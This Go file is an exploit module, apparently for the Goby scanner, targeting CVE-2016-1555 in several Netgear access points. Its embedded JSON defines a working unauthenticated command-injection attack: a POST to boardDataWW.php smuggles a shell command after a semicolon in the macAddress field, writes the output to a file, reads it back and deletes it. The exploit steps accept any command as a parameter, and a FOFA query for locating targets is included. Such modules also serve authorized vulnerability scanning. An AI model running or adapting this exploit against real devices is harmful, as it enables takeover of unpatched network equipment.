package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Netgear Devices boardDataWW.php Unauthenticated Remote Command Execution",
    "Description": "<p>(1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute arbitrary commands.</p>",
    "Product": "NETGEAR",
    "Homepage": "https://www.netgear.com/",
    "DisclosureDate": "2023-2-6",
    "Author": "mayi",
    "FofaQuery": "title==\"Netgear\"",
    "GobyQuery": "title==\"Netgear\"",
    "Level": "3",
    "Impact": "<p>(1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute arbitrary commands.</p>",
    "Recommendation": "<p>1. If it is not necessary, it is forbidden to access the system from the public network.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. The manufacturer has released a bug fix, please pay attention to the update in time:<a href=\"https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic\">https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic</a></p>",
    "References": [
        "https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/boardDataWW.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "macAddress=112233445566%3Bid+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/output",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/boardDataWW.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "macAddress=112233445566%3Brm+.%2Foutput+%23&reginfo=0&writeData=Submit"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/boardDataWW.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "macAddress=112233445566%3B{{{cmd}}}+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/output",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|{{{lastbody}}}"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/boardDataWW.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "macAddress=112233445566%3Brm+.%2Foutput+%23&reginfo=0&writeData=Submit"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2016-1555"
    ],
    "CNNVD": [
        "CNNVD-201604-397"
    ],
    "CNVD": [
        "CNVD-2016-01687"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Netgear 多款设备 boardDataWW.php 文件命令执行漏洞",
            "Product": "NETGEAR",
            "Description": "<p>Netgear是全球领先的企业网络解决方案，及数字家庭网络应用倡导者。</p><p>Netgear多款设备存在验证绕过漏洞，攻击者利用漏洞可在未验证的网页直接传递输入命令行，发起命令注入攻击。</p>",
            "Recommendation": "<p>1、如非必要，禁止公网访问该系统。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic\" target=\"_blank\">https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic</a></p>",
            "Impact": "<p>Netgear是全球领先的企业网络解决方案，及数字家庭网络应用倡导者。</p><p>Netgear多款设备存在验证绕过漏洞，攻击者利用漏洞可在未验证的网页直接传递输入命令行，发起命令注入攻击。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Netgear Devices boardDataWW.php Unauthenticated Remote Command Execution",
            "Product": "NETGEAR",
            "Description": "<p>(1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute arbitrary commands.<br></p>",
            "Recommendation": "<p>1. If it is not necessary, it is forbidden to access the system from the public network.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. The manufacturer has released a bug fix, please pay attention to the update in time:<a href=\"https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic\" target=\"_blank\">https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic</a></p>",
            "Impact": "<p>(1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute arbitrary commands.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10809"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

